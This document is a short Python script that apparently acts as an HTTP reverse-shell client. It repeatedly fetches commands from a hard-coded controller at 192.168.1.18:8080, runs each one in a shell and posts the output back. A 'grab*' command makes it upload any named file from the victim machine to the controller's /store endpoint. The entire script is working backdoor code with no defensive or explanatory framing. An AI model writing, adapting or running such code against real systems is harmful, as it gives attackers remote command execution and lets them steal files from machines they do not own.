import requests
import time
import subprocess
import os

HOST = '192.168.1.18'
PORT = 8080

def main():
    url = 'http://{host}:{port}'.format(host=HOST, port=PORT)

    while True:
        req = requests.get(url)
        cmd = req.text

        if cmd in ('exit', 'shutdown'):
            requests.post(url, data='Client is shutting down')
            break
        elif 'grab*' in cmd:
            filename = cmd.split('*')[1]
            if os.path.exists(filename):
                with open(filename, 'rb') as f:
                    files = {filename: f}
                    requests.post(url + '/store', files=files)
            else:
                requests.post(url, data='[!] There was an error sending the file {filename}'.format(filename=filename))
        else:
            popen = subprocess.Popen(cmd,
                                     shell=True,
                                     stderr=subprocess.STDOUT,
                                     stdout=subprocess.PIPE)
            requests.post(url, data=popen.stdout.read())

        time.sleep(3)

if __name__ == '__main__':
    main()
